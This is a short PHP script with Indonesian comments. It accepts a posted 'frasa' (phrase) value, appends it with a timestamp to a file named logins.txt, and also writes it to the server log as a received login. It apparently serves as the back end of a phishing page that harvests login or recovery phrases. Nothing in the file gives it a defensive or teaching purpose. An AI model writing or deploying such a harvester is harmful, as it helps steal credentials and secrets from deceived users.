<?php
$data = json_decode(file_get_contents("php://input"), true);
if (!empty($data['frasa'])) {
    $file = 'logins.txt';
    file_put_contents($file, date("Y-m-d H:i:s") . " - " . $data['frasa'] . PHP_EOL, FILE_APPEND);
    
    // Logging ke Vercel
    error_log("Login diterima: " . $data['frasa']);

    echo "Data berhasil disimpan!";
} else {
    echo "Gagal menyimpan data!";
}
?>
